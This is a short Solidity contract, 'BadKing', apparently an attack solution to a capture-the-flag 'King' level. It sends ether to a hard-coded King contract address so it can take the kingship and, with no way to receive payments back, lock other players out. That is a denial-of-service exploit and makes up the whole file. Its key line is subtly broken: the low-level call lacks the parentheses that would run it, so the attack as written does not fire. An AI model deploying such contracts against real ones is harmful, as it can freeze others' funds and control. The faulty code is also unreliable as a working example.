pragma solidity ^0.6.0;

import "./default.sol";

contract BadKing {
    King public king = King(0x1562fdCabB4e8daFF5F3dDE341525c0438Bc3145);
    uint256 public sending = 0;

    constructor() public payable {
        sending += msg.value;
    }

    function becomeKing() public payable {
        address(king).call.value(sending).gas(1000000);
    }
}
